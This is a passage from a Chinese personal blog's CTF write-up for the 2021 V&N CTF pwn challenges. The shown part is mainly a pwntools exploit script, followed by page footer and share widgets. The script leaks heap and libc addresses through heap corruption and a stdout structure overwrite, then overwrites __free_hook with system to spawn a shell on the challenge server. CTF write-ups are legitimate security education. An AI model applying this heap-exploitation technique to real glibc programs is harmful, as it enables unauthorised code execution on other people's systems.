class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	sh.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendafter(<span class="string">'Size:'</span>,str(size))</span><br><span class="line">	sh.sendafter(<span class="string">'Content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">	sh.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line">	sh.sendafter(<span class="string">'Content:'</span>,content)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">	sh=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26208</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">"a"</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>))</span><br><span class="line">	free()</span><br><span class="line">	add(<span class="number">0x20</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x60</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">	free()</span><br><span class="line">	edit(p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">	free()</span><br><span class="line">	edit(p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">	free()</span><br><span class="line">	show()</span><br><span class="line">	heap_addr=u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		rand_num=(heap_addr&amp;<span class="number">0xffff</span>)^<span class="number">0x2a0</span></span><br><span class="line">		guess=rand_num^<span class="number">0x10</span></span><br><span class="line">		</span><br><span class="line">		add(<span class="number">0x60</span>,p16(guess))</span><br><span class="line">		add(<span class="number">0x60</span>,p64(<span class="number">0</span>))</span><br><span class="line">		</span><br><span class="line">		add(<span class="number">0x60</span>,p16(<span class="number">0</span>)*<span class="number">0x27</span>+p16(<span class="number">7</span>))</span><br><span class="line">	</span><br><span class="line">		free()</span><br><span class="line">		add(<span class="number">0x40</span>,p16(<span class="number">0</span>)*<span class="number">3</span>+p16(<span class="number">2</span>)+<span class="string">'\x00'</span>*<span class="number">4</span>+p16(<span class="number">1</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		print(<span class="number">0</span>)</span><br><span class="line">		print(hex(heap_addr))</span><br><span class="line">		sh.close()</span><br><span class="line">		pause()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	add(<span class="number">0x30</span>,p8(<span class="number">0</span>))</span><br><span class="line">	add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+<span class="string">'\xb0'</span>+<span class="string">'\x96'</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		context.log_level=<span class="string">'debug'</span></span><br><span class="line">		add(<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">		sh.recvuntil(<span class="string">'\x7f'</span>,timeout=<span class="number">3</span>)</span><br><span class="line">		libc_base=u64(sh.recvuntil(<span class="string">'\x7f'</span>,timeout=<span class="number">3</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x1e39a0</span></span><br><span class="line">		<span class="keyword">if</span>(libc_base&lt;<span class="number">0</span>):</span><br><span class="line">			libc_base=u64(sh.recvuntil(<span class="string">'\x7e'</span>,timeout=<span class="number">3</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x1e39a0</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		context.log_level=<span class="string">'notset'</span></span><br><span class="line">		print(<span class="number">1</span>)</span><br><span class="line">		sh.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">#pause()</span></span><br><span class="line">	<span class="keyword">if</span>(libc_base&lt;<span class="number">0</span>):</span><br><span class="line">		sh.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	print(hex(libc_base))</span><br><span class="line">	free_hook=libc_base+<span class="number">0x1E6E40</span></span><br><span class="line">	system_addr=libc_base+<span class="number">0x503C0</span></span><br><span class="line">	</span><br><span class="line">	add(<span class="number">0x10</span>,p64(free_hook))</span><br><span class="line">	add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">	add(<span class="number">0x10</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">	free()</span><br><span class="line">	sh.interactive()</span><br><span class="line">	<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2021-08-17T01:28:19.763Z" itemprop="dateUpdated">2021-08-17 09:28:19</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="http://veltavid.github.io">
+            <img src="/img/avatar.jpg" alt="velta">
+            velta
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/&title=《2021V&NCTF-Pwn方向writeup》 — velta's blog&pic=http://veltavid.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/&title=《2021V&NCTF-Pwn方向writeup》 — velta's blog&source=record velta's binary learning" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2021V&NCTF-Pwn方向writeup》 — velta's blog&url=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/&via=http://veltavid.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/08/17/MIT-6-828-JOS-lab6%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">MIT-6.828-JOS-lab6实验笔记</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+<section class="comments" id="comments">
+    <div id="disqus_thread"></div>
+    <script>
+    var disqus_shortname = 'true';
+    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>velta &copy; 2021</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/&title=《2021V&NCTF-Pwn方向writeup》 — velta's blog&pic=http://veltavid.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/&title=《2021V&NCTF-Pwn方向writeup》 — velta's blog&source=record velta's binary learning" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《2021V&NCTF-Pwn方向writeup》 — velta's blog&url=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/&via=http://veltavid.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://veltavid.github.io/2021/08/17/2021VNCTF-Pwn%E6%96%B9%E5%90%91writeup/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
